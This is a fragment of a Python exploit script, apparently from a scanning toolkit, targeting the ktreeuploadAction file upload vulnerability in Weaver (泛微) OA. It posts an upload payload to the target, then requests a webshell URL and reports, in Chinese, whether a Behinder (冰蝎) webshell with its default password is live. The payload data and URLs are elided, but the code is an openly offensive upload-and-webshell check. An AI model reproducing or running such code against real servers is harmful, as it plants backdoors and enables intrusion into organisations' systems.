...
def main(target_url):
    ...
    success_msg = now_time() + '[SUCCESS]泛微文件上传漏洞存在'
    warning_msg = now_time() + '[WARNING]泛微ktreeuploadAction文件上传漏洞不存在'
    error_msg = now_time() + '[泛微ktreeuploadAction文件上传漏洞][ERROR]代码异常，或无法连接目标'
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        shell=requests.get(shell_url,verify=False)
        shell_msg = now_time() + '冰蝎默认密码:{}'.format(shell)
        if upload.status_code == 200:
            if shell.status_code == 200:
                return success_msg,shell
            else:
                return now_time() + ' [WARNING]  泛微ktreeuploadAction上传漏洞payload执行成功，但木马检测失败哦'
        else:
            return warning_msg
    except:
        return error_msg
